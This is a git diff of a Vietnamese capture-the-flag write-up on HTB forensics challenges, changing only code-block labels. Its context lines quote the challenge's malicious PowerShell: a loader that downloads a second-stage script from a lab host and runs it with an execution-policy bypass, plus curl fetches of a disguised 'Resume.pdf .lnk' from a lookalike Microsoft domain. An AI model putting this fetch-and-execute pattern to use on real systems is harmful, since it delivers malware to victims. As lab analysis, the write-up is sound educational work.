@@ -113,7 +113,7 @@ Well, chúng ta sẽ injection bằng cách chèn `;` sau lệnh
 >Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.
 
 File artifact.ps1: một script PowerShell
-```terminal
+```bash
 $ function qt4PO {
     if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
         exit
@@ -124,7 +124,7 @@ qt4PO
 ```
 
 Đầu tiên, chúng ta sẽ thêm domain `korp.htb` trỏ đến IP Docker XX.XXX.XX.XXX
-```terminal
+```bash
 $ echo "XX.XXX.XX.XXX korp.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -135,7 +135,7 @@ $ echo "XX.XXX.XX.XXX korp.htb" | sudo tee -a /etc/hosts
 Vậy chúng ta đã biết là đoạn mã độc sẽ chạy và thực thi tại:`http://korp.htb/update`
 
 Mình sẽ thử dùng curl để xem response của `http://korp.htb:[port]/update`
-```terminal
+```bash
 $ function aqFVaq {
     Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
     powershell.exe -exec Bypass -File "a541a.ps1"
@@ -151,12 +151,12 @@ Hàm `aqFVaq` thực hiện 2 nhiệm vụ:
 Hmmm, có vẻ chúng ta sẽ thử tải file `a541a.ps1` để xem nó thực thi gì
 
 Để tải file chúng ta sẽ dùng curl với options -H (thêm Headers) để server chấp nhập request và -o (để lưu file)
-```terminal
+```bash
 $ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb:[port]/a541a -o a541a.ps1
 ```
 
 Sau khi tải về và `cat` file chúng ta nhận được
-```terminal
+```bash
 $ a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
 ($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
 ```
@@ -189,7 +189,7 @@ PS: Make sure you replace the '[PORT]' with your instance's port. Additionally, 
 ```
 
 Có vẻ như bài gợi ý chúng ta cần phải thêm domain `storage.microsoftcloudservices.com` trỏ đến IP Docker XX.XXX.XX.XXX
-```terminal
+```bash
 $ echo "XX.XXX.XX.XXX storage.microsoftcloudservices.com" | sudo tee -a /etc/hosts
 ```
 
@@ -218,7 +218,7 @@ Mình sẽ thử dùng curl xem server sẽ trả về gì
 ```
 
 Nice, vậy chúng ta sẽ tải file về và xem có flag không
-```terminal
+```bash
 $ curl "http://storage.microsoftcloudservices.com:[port]/3fe1690d955e8fd2a0b282501570e1f4/resumes/Resume.pdf%20.lnk" -o resume.lnk
 ```
 ![anewhire1](/assets/images/HTB-Apocalypse/Forensics/forensics_a_new_hire/anewhire1.png)
@@ -258,7 +258,7 @@ Phân tích lại đoạn này mình nhận ra là có Parent Directory, vậy t
 ```
 
 Vì mình đã mò file chứa flag (hoặc 1 đoạn mã flag bị encode) nên mình sẽ hướng dẫn lấy nó luôn
-```terminal
+```bash
 $ curl http://storage.microsoftcloudservices.com:[port]/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py
 ```
 
